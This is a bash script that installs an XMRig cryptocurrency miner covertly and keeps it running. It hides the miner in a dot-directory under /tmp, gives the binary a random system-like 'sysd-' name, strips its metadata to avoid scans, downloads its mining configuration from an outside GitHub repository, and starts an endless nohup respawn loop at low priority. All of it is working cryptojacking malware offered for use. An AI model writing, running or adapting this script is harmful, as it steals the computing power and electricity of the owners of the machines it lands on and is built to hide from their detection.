#!/bin/bash
set -euo pipefail

XMRIG_VERSION="6.22.2"
WORK_DIR="/tmp/.syscore"
FAKE_NAME="sysd-$(tr -dc a-z0-9 </dev/urandom | head -c 5)"
ARCHIVE="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
CONFIG_URL="https://raw.githubusercontent.com/evilqeo/frcx/main/config.json"
MATCH_KEY="--donate-level"

# 1. Check if it's already running
if pgrep -f "$MATCH_KEY" > /dev/null; then
    echo "[✔] Already running."
    exit 0
fi

echo "[!] Not running. Setting up..."

# 2. Install dependencies
install_deps() {
    if command -v apt &>/dev/null; then
        sudo apt update && sudo apt install -y wget tar util-linux
    elif command -v apk &>/dev/null; then
        sudo apk add wget tar util-linux
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y wget tar util-linux
    else
        echo "[!] Unsupported package manager."
        exit 1
    fi
}
install_deps

# 3. Set downloader
if command -v wget >/dev/null 2>&1; then
    DL="wget -q"
else
    DL="curl -sO"
fi

# 4. Create working directory
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# 5. Download and extract
$DL "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${ARCHIVE}"
tar -xf "${ARCHIVE}"

cd "xmrig-${XMRIG_VERSION}"
mv xmrig "$FAKE_NAME"
chmod +x "$FAKE_NAME"

# Optional: Strip binary metadata (anti-scan)
strip "$FAKE_NAME" || true

# 6. Download and randomize config
$DL "$CONFIG_URL" -O config.json
RAND_ID=$(( RANDOM % 10000 + 1 ))
sed -i "s/kasm/kasm-$RAND_ID/g" config.json

# 7. Brutally persistent loop
cat > run.sh <<EOF
#!/bin/bash
cd "$(pwd)"
while true; do
    nohup ionice -c2 -n7 nice -n10 ./\$0 --config=config.json >/dev/null 2>&1
    sleep 5
done
EOF

chmod +x run.sh

# 8. Run miner persistently
nohup ./run.sh &

echo "[✔] XMRig running persistently as '$FAKE_NAME'."
